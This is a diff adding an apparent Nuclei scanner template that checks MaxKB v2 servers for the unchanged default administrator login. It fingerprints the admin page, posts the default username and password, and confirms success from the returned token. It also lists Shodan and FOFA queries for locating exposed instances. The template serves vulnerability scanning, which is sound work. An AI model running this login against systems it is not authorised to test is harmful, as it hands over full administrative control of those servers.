@@ -1,0 +1,67 @@
+id: maxkb-default-login
+
+info:
+  name: MaxKB - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    MaxKB v2 creates the built-in administrator account admin with the default password MaxKB@123.. on first start, and the password remains valid until it is changed. An attacker who logs in with these credentials gains full administrative control over the knowledge bases, LLM model providers, applications and user accounts.
+  reference:
+    - https://github.com/1Panel-dev/MaxKB/blob/v2.10.8-lts/README.md
+    - https://github.com/1Panel-dev/MaxKB/blob/v2.10.8-lts/apps/users/migrations/0001_initial.py
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    vendor: 1panel
+    product: maxkb
+    shodan-query: http.title:"MaxKB"
+    fofa-query: title="MaxKB"
+  tags: maxkb,1panel,default-login,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "<title>MaxKB</title>")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /admin/api/user/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - MaxKB@123..
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'regex("\"code\"\\s*:\\s*200\\s*,", body)'
+          - 'regex("\"token\"\\s*:\\s*\"[^\"]{20,}\"", body)'
+          - 'contains(header, "mk_file_auth=")'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
